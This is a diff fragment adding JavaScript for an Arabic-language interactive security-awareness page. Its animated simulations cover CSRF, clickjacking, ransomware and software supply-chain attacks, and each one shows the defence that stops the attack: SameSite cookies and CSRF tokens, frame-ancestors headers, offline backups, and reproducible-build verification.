+          toast('سرقة مكتملة الأركان: البنك لم يُخترق وجهازك لم يُلمس — متصفحك نفّذ الحوالة بملفاته هو. الآن فعّل SameSite وأعد الزيارة.','warn');
+        }
+      }else if(C.ss){
+        row([['401','c-acc'],['لا جلسة — الطلب وصل مجهول الهوية ورُفض. الكوكي لم يغادر حدود الموقع أصلاً','c-acc']]);
+        toast('صدّها SameSite: ملف الجلسة لم يعبر إلى موقع القطط. وانتبه — Strict يعطل بعض روابط الدخول الخارجية، لذا Lax هو الافتراضي الحديث وهو أضعف قليلاً.');
+      }else{
+        row([['403','c-acc'],['رمز CSRF غائب — حُجب في بوابة البنك قبل الوصول إلى الحوالات. السرّ الجلسي لا يعرفه موقع خارجي','c-acc']]);
+        toast('صدّها الرمز المضاد: النموذج الخبيث يحمل كل شيء إلا السرّ الذي يُصدَر لنماذج البنك وحدها.');
+      }
+      C.busy=false;
+    },2300);
+  });
+  $('#cfReset').addEventListener('click',()=>{
+    C.bal=12400;updBal();
+    flow.innerHTML='<div class="cap"><span class="ct" dir="ltr">--:--:--</span><span class="chipx c-dim">عبْر السلك — ما يصل بنك المستقبل من كل تبويب تفتحه</span></div>';
+    $('#cfTr').innerHTML='<div class="cap"><span class="ct" dir="ltr">09:14</span><span class="chipx c-dim">220 → فاتورة الكهرباء — من داخل تطبيق البنك، بيدك</span></div>';
+  });
+  updBal();
+})();
+
+/* ============ 08 · اختطاف النقرة ============ */
+(function(){
+  const J={frame:false,stolen:0};
+  const stage=$('#cjStage'),status=$('#cjStatus');
+  const setStatus=t=>{status.textContent=t;};
+  $('#cjXraySw').addEventListener('click',()=>{
+    $('#cjXraySw').classList.toggle('on');
+    stage.classList.toggle('xray');
+    if(stage.classList.contains('xray'))setStatus('الآن ترى الخدعة كاملة: زر الجائزة فوق زر الموافقة تماماً — انقره والأشعة تعمل لتشاهد أين تهبط النقرة.');
+    else setStatus('الطبقة العليا مصمتة من جديد — الضحية لا يرى شيئاً تحت زره.');
+  });
+  $('#cjFrameSw').addEventListener('click',()=>{
+    J.frame=!J.frame;
+    $('#cjFrameSw').classList.toggle('on',J.frame);
+    stage.classList.toggle('framed',J.frame);
+    if(J.frame){
+      setStatus('اختفى البنك من تحت الجائزة: رفض التضمين منذ البداية — لا شيء يُختطف أصلاً.');
+      toast('هذا كل سر الحماية: خيار واحد في رؤوس استجابة البنك (X-Frame-Options / frame-ancestors) أوقف الهجوم كاملاً — على الخادم، لا عند المستخدم.');
+    }else setStatus('عاد البنك قابلاً للتأطير — والطبقة الشفافة معه.');
+  });
+  $('#cjLureBtn').addEventListener('click',()=>{
+    if(J.frame){
+      setStatus('نقرتك ذهبت إلى صفحة جائزة وهمية فقط — لا بنك تحتها، ولا حوالة، ولا شيء.');
+      return;
+    }
+    J.stolen+=800;
+    $('#cjMoney').textContent=fmtN(J.stolen);
+    const b=$('#cjBankBtn');
+    if(b.animate)b.animate([{background:'rgba(229,72,77,.55)'},{background:'rgba(91,190,142,.1)'}],{duration:700});
+    setStatus('نفّذتَ «وافق على التحويل» — 800 غادرت حسابك ولم ترَ واجهة البنك لحظة واحدة.');
+    if(J.stolen===800)toast('أنت الآن ضحية اختطاف نقرات: النقرة «ذهبت» للزر الذي تراه، وهبطت على زر آخر في صفحة شفافة تحته. جرّب أشعة X لترى كيف.','warn');
+  });
+  $('#cjReset').addEventListener('click',()=>{
+    J.stolen=0;$('#cjMoney').textContent='0';
+    setStatus('انقر زر الجائزة مباشرة لتعيش التجربة كضحية — أو فعّل «أشعة X» أولاً لترى الخدعة.');
+  });
+})();
+
+/* ============ 09 · برنامج الفدية ============ */
+(function(){
+  const FILES=[
+    ['تقرير_المشروع.docx','doc','2.4 MB'],
+    ['عقد_2024.pdf','doc','860 KB'],
+    ['صور_العائلة','folder','1.8 GB'],
+    ['شهادة_التخرج.pdf','doc','1.1 MB'],
+    ['محفظة_كلمات_المرور.kdbx','db','96 KB'],
+    ['فيديو_الزفاف.mp4','media','3.2 GB'],
+    ['دفتر_الحسابات.xlsx','sheet','4.7 MB'],
+    ['أرشيف_البريد.pst','db','640 MB'],
+    ['الرسالة_الجامعية.docx','doc','18 MB'],
+    ['تصاميم_العمل.psd','img','220 MB'],
+    ['ألبوم_السفر','img','2.9 GB'],
+    ['سجل_العملاء.csv','sheet','12 MB'],
+  ];
+  const IC={
+    doc:'<rect x="6" y="3" width="14" height="20" rx="1.5"/><path d="M9 8h8M9 12h8M9 16h5"/>',
+    folder:'<path d="M4 7a2 2 0 0 1 2-2h5l2 3h7a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2Z"/>',
+    img:'<rect x="4" y="6" width="18" height="14" rx="1.5"/><circle cx="9" cy="11" r="2"/><path d="M4 18l5-5 4 4 3-3 6 6"/>',
+    media:'<rect x="4" y="5" width="18" height="16" rx="2"/><path d="M11 10l6 3-6 3Z"/>',
+    sheet:'<rect x="5" y="4" width="16" height="18" rx="1.5"/><path d="M5 10h16M5 15h16M11 4v18"/>',
+    db:'<ellipse cx="13" cy="7" rx="8" ry="3"/><path d="M5 7v12c0 1.7 3.6 3 8 3s8-1.3 8-3V7"/><path d="M5 13c0 1.7 3.6 3 8 3s8-1.3 8-3"/>',
+    lock:'<rect x="7" y="11" width="12" height="9" rx="2"/><path d="M9.5 11V8.5a3.5 3.5 0 0 1 7 0V11"/>'
+  };
+  const ico=(t,locked)=>{
+    const body=locked?IC.lock:IC[t];
+    const col=locked?'#E5484D':'#5E6870';
+    return `<svg width="26" height="26" viewBox="0 0 26 26" fill="none" stroke="${col}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">${body}</svg>`;
+  };
+  const gib=()=>{
+    const c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$#@!';
+    let s='';for(let i=0;i<8;i++)s+=c[Math.floor(Math.random()*c.length)];
+    return s+'.locked';
+  };
+  const R={inf:false,busy:false,bk:true,timer:null,secs:48*3600,resolved:false};
+  const grid=$('#rwGrid');
+  function render(){
+    grid.innerHTML='';
+    FILES.forEach(f=>{
+      const d=document.createElement('div');d.className='rw-file';
+      d.innerHTML=`<div class="rw-ic">${ico(f[1],false)}</div><div class="rw-name">${f[0]}</div><div class="rw-size">${f[2]}</div>`;
+      grid.appendChild(d);
+    });
+  }
+  render();
+  function rlog(chips){
+    const log=$('#rwLog'),r=document.createElement('div');r.className='cap';
+    let h=`<span class="ct" dir="ltr">${nowT()}</span>`;
+    chips.forEach(([t,c])=>h+=`<span class="chipx ${c}" dir="auto">${t}</span>`);
+    r.innerHTML=h;log.prepend(r);
+    while(log.children.length>7)log.lastChild.remove();
+  }
+  function stopT(){if(R.timer){clearInterval(R.timer);R.timer=null;}}
+  function startT(){
+    stopT();R.secs=48*3600;
+    R.timer=setInterval(()=>{
+      if(R.secs>0)R.secs--;
+      const h=Math.floor(R.secs/3600),m=Math.floor(R.secs%3600/60),s=R.secs%60;
+      $('#rwTimer').textContent=[h,m,s].map(v=>String(v).padStart(2,'0')).join(':');
+    },1000);
+  }
+  function noteVis(){
+    $('#rwNote').hidden=!R.inf;
+    $('#rwEmpty').style.display=R.inf?'none':'';
+    $('#rwRestore').style.display=(R.inf&&R.bk)?'':'none';
+    $('#rwBkHint').style.display=R.bk?'':'none';
+  }
+  $('#rwBkSw').addEventListener('click',()=>{
+    R.bk=!R.bk;$('#rwBkSw').classList.toggle('on',R.bk);
+    noteVis();
+  });
+  $('#rwInfect').addEventListener('click',()=>{
+    if(R.busy||R.inf)return;R.busy=true;R.resolved=false;
+    $('#rwInfect').disabled=true;
+    rlog([['EXE','c-red'],['المرفق بدأ التنفيذ — مثبِّت صامت يتخطى كل نوافذ التأكيد','c-red']]);
+    setTimeout(()=>rlog([['NET','c-red'],['رُفعت قائمة ملفاتك إلى خادم المهاجم — الابتزاز المزدوج يبدأ قبل التشفير أصلاً','c-red']]),700);
+    setTimeout(()=>rlog([['AES-256','c-red'],['التشفير يجري محلياً بمفتاح وُلّد على جهازك ورُفع مشفّراً إلى المهاجم','c-red']]),1400);
+    const tiles=[...grid.children];
+    tiles.forEach((el,i)=>{
+      setTimeout(()=>{
+        el.classList.add('locked');
+        el.querySelector('.rw-ic').innerHTML=ico('x',true);
+        el.querySelector('.rw-name').textContent=gib();
+        if(i%4===0)rlog([['LOCK','c-red'],['مجموعة ملفات فقدت مفاتيحها — كان اسمها: '+FILES[i][0],'c-red']]);
+      },1900+i*170);
+    });
+    setTimeout(()=>{
+      R.inf=true;R.busy=false;
+      noteVis();startT();
+      rlog([['NOTE','c-red'],['ملاحظة الفدية ظهرت — العدّاد يعدّ تنازلياً، وكل الخيارات سيئة إلا واحداً','c-red']]);
+      toast('خُطفت ملفاتك في ثوانٍ — التشفير سلاحٌ شرعي بيد خاطئة. النسخة الاحتياطية مفعّلة: جرّب «استعادة»، ثم أطفئها وأعد العدّ لترى وجه المقامرة الحقيقي.','warn');
+    },1900+FILES.length*170+300);
+  });
+  function restore(msg){
+    [...grid.children].forEach((el,i)=>{
+      setTimeout(()=>{
+        el.classList.remove('locked');
+        el.querySelector('.rw-ic').innerHTML=ico(FILES[i][1],false);
+        el.querySelector('.rw-name').textContent=FILES[i][0];
+      },i*60);
+    });
+    R.inf=false;R.resolved=true;stopT();
+    noteVis();
+    $('#rwInfect').disabled=false;
+    rlog(msg);
+  }
+  $('#rwRestore').addEventListener('click',()=>{
+    if(!R.inf||R.resolved)return;
+    restore([['RESTORE','c-grn'],['استعادة من نسخة خارج الشبكة — لم تُلَس أصلاً؛ الفدية فقدت كل قيمتها قبل أن تُطلب','c-grn']]);
+    toast('هذا هو العلاج الوحيد الموثوق: نسخة لا يستطيع المهاجم الوصول إليها. كل الدروس الأخرى — الدفع والمفاوضة — بدائل فاشلة عن هذا الزر.');
+  });
+  $('#rwPay').addEventListener('click',()=>{
+    if(!R.inf||R.resolved)return;
+    if(Math.random()<0.45){
+      restore([['KEY','c-acc'],['وصل مفتاح وفُكّ التشفير — نجوت بالمقامرة هذه المرة: دفعتَ ثمن الهجمة القادمة على غيرك، وبياناتك سُرِّقت أصلاً قبل التشفير','c-acc']]);
+    }else{
+      R.resolved=true;stopT();
+      rlog([['SCAM','c-red'],['المفتاح لم يصل — لا شرطة ولا ضمانات مع مجرم، والنسخة المسروقة من بياناتك ما زالت بيده للابتزاز الثاني','c-red']]);
+      toast('خسرتَ المال والملفات معاً — في واقع الابتزاز المزدوج هذا أكثر سيناريوهات الدفع شيوعاً.','warn');
+    }
+  });
+  $('#rwRefuse').addEventListener('click',()=>{
+    if(!R.inf||R.resolved)return;R.resolved=true;stopT();
+    rlog([['LOST','c-red'],['الملفات ضاعت — لكن لم تُموّل جريمة اليوم؛ وبنسخة خارج الشبكة لم يكن لهذا المشهد وجود أصلاً','c-red']]);
+    toast('خسارة مؤكدة اليوم، لكنها لا تموّل صناعة الفدية — والحل الحقيقي كان دائماً: نسخ احتياطية خارج الشبكة.');
+  });
+  $('#rwReset').addEventListener('click',()=>{
+    R.inf=false;R.busy=false;R.resolved=false;stopT();
+    $('#rwInfect').disabled=false;
+    noteVis();render();
+    $('#rwLog').innerHTML='';
+    rlog([['SYS','c-dim'],['قرصك سليم من جديد — والتجربة أمامك: مرفق واحد، و12 ملفاً بينه وبين النسيان']]);
+  });
+  noteVis();
+})();
+
+/* ============ 10 · سلسلة التوريد ============ */
+(function(){
+  const S={verify:false,busy:false,inf:0};
+  const svg=$('#scSvg'),pkts=$('#scPkts'),squaresG=$('#scSquares'),build=$('#scBuild');
+  const sq=[];
+  for(let r=0;r<4;r++)for(let c=0;c<6;c++){
+    const x=-141+c*44,y=-44+r*30;
+    const rect=document.createElementNS(ns,'rect');
+    rect.setAttribute('x',x);rect.setAttribute('y',y);
+    rect.setAttribute('width',38);rect.setAttribute('height',24);
+    rect.setAttribute('class','cl');
+    squaresG.appendChild(rect);sq.push(rect);
+  }
+  function slog(chips){
+    const log=$('#scLog'),r=document.createElement('div');r.className='cap';
+    let h=`<span class="ct" dir="ltr">${nowT()}</span>`;
+    chips.forEach(([t,c])=>h+=`<span class="chipx ${c}" dir="auto">${t}</span>`);
+    r.innerHTML=h;log.prepend(r);
+    while(log.children.length>7)log.lastChild.remove();
+  }
+  function updCount(){
+    const el=$('#scCount');
+    el.textContent=fmtN(S.inf*1000)+' / 24,000';
+    el.classList.toggle('bad',S.inf>0);
+  }
+  function pulseAt(x,y,grn){
+    const c=document.createElementNS(ns,'circle');
+    c.setAttribute('cx',x);c.setAttribute('cy',y);c.setAttribute('r',26);
+    c.setAttribute('class','pulse '+(grn?'p-grn':'p-red'));
+    svg.appendChild(c);setTimeout(()=>c.remove(),750);
+  }
+  function packet(kind){
+    const g=document.createElementNS(ns,'g');
+    g.innerHTML=kind==='bad'
+      ?'<rect x="-8" y="-5.5" width="16" height="11" rx="1.5" class="pk-udp"/><line x1="-4" y1="-1.5" x2="4" y2="-1.5" class="pl"/><line x1="-4" y1="2" x2="2" y2="2" class="pl"/>'
+      :'<circle r="5" class="pk-legit"/>';
+    pkts.appendChild(g);return g;
+  }
+  const wait=ms=>new Promise(r=>setTimeout(r,ms));
+  async function run(){
+    if(S.busy)return;S.busy=true;
+    slog([['PUSH','c-grn'],['المطوّر دفع إصداراً نظيفاً — الشيفرة في المستودع سليمة مئة بالمئة','c-grn']]);
+    let p=packet('ok');
+    await tween(p,846,110,662,110,800);
+    p.remove();pulseAt(620,110,true);
+    await wait(400);
+    slog([['BUILD · PWNED','c-red'],['خادم البناء اخترق — شيفرة خبيثة حُقنت في مرحلة التجميع: بعد فحص المصدر وقبل التوقيع','c-red']]);
+    build.classList.add('bad');
+    await wait(600);
+    slog([['SIGN','c-red'],['وُقّع التحديث المسموم بتوقيع الشركة «الأصلي» — الشهادة سليمة، المصنع هو الملوّث','c-red']]);
+    p=packet('bad');
+    await tween(p,578,110,462,110,800);
+    if(S.verify){
+      pulseAt(430,110,true);
+      p.remove();
+      slog([['VERIFY','c-grn'],['رفض التثبيت: حِمل البناء لا يطابق إعادة إنتاج المصدر — توقيع أصلي مع بناء مغاير = مؤامرة مكشوفة','c-grn']]);
+      toast('أنقذها التحقق القابل للإعادة: العميل يعيد بناء الشيفرة من المصدر ويقارن بايت-ببايت — فأي حقن يظهر مهما صَدُق التوقيع.');
+      S.busy=false;return;
+    }
+    await tween(p,398,110,240,110,600);
+    p.remove();pulseAt(195,110,false);
+    slog([['INSTALL','c-red'],['التحديث «الموقّع» يثبّت نفسه لدى العملاء تلقائياً — لا أحد يراجع تحديثاً من مزوّده الموثوق','c-red']]);
+    for(let i=0;i<sq.length;i++){
+      await wait(120);
+      sq[i].classList.add('inf');S.inf++;
+      if(i%6===0)updCount();
+    }
+    updCount();
+    slog([['PWNED','c-red'],['24,000 منظمة استقبلت باباً خلفياً موقّعاً باسم مزوّدها نفسه — دون خطأ واحد في الشيفرة التي راجعها أحد','c-red']]);
+    toast('اكتملت السلسلة: لم يُخترق أي عميل ولم تُسرق أي شهادة — اخترق «مصنع الثقة» نفسه. الآن فعّل التحقق وأعد الهجوم.','warn');
+    S.busy=false;
+  }
+  $('#scAttack').addEventListener('click',run);
+  $('#scVerSw').addEventListener('click',()=>{
+    S.verify=!S.verify;$('#scVerSw').classList.toggle('on',S.verify);
+  });
+  $('#scReset').addEventListener('click',()=>{
+    if(S.busy)return;
+    sq.forEach(s=>s.classList.remove('inf'));S.inf=0;updCount();
+    build.classList.remove('bad');
+    pkts.innerHTML='';
+    $('#scLog').innerHTML='';
+    slog([['SYS','c-dim'],['الخط نظيف من جديد — اضغط «زرع» لتكرار التجربة بوضع التحقق الحالي']]);
+  });
+  const PKGS={
+    ok:{cls:'ok',t:'اختيار سليم',b:'الناشر الأصلي للحزمة · تاريخ إصدارات منذ سنوات · ملايين التحميلات اليومية — الاسم المعروف من مصدره المعروف.'},
+    typo:{cls:'bad',t:'فخ حروف منقولة',b:'حساب ناشئ منذ يومين · 38 تحميلاً · لا مستودع شيفرة — «reqeusts» اسم صُمم لالتقاط المستعجلين فقط.'},
+    squat:{cls:'bad',t:'فخ تسمية لاصقة',b:'يحاكي التسمية الرسمية كملحق «تطوير» — القاعدة: الحزمة الرسمية تحمل اسمها الكامل من مصدرها، والملحقات الغريبة تدق ناقوس الخطر.'}
+  };
+  $$('#scPkgs button').forEach(b=>b.addEventListener('click',()=>{
+    const k=PKGS[b.dataset.p],el=$('#scPkgRes');
+    el.className='show '+k.cls;
+    el.innerHTML=`<b>${k.t}</b><span>${k.b}</span>`;
+    if(b.dataset.p!=='ok')toast('قبل كل تثبيت من سجل عام: راجع الناشر، عمر الحزمة، عدد التحميلات، ووجود مستودع شيفرة — دقائق تفرّق بين مكتبة وباب خلفي.','warn');
+  }));
+  updCount();
 })();
 })();
 </script>
